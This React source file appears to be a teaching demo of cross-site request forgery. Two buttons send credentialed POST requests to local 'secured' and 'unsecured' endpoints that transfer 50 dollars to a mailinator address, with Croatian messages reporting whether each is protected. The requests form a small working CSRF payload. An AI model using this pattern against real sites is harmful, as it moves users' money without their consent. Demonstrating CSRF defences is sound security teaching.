import React, {useState} from 'react';

function App() {
    const [responseText, setResponseText] = useState("")

  return (
    <div className="App">
      <header className="App-header">
        <button
          className="App-link"
          onClick={() => fetch("http://localhost:8080/user/sendCsrf", {
            method: "POST",body:JSON.stringify({"receiver":"ttihic@mailinator.com","money":50}) ,credentials: "include", headers: {
                  "Content-Type": "application/json",
              }
          }).then(response => {
              if (response.status !== 200) {
                  setResponseText("http status " + response.status + ", endpoint je zasticen od csrf napada")
              }
          })
        }
        >
          Send secured
        </button><button
          className="App-link"
          onClick={() => fetch("http://localhost:8080/user/sendUnsecured", {
            method: "POST",body:JSON.stringify({"receiver":"ttihic@mailinator.com","money":50}) ,credentials: "include", headers: {
                  "Content-Type": "application/json",
              }
          }).then(response => {
              if (response.status === 200) {
                  setResponseText("http status " + response.status + ", endpoint nije zasticen, 50 dolara poslano na account ttihic@mailinator.com")
              }
          })}
        >
          Send unsecured
        </button>
      </header>
        <div>
            {responseText}
        </div>
    </div>
  );
}

export default App;
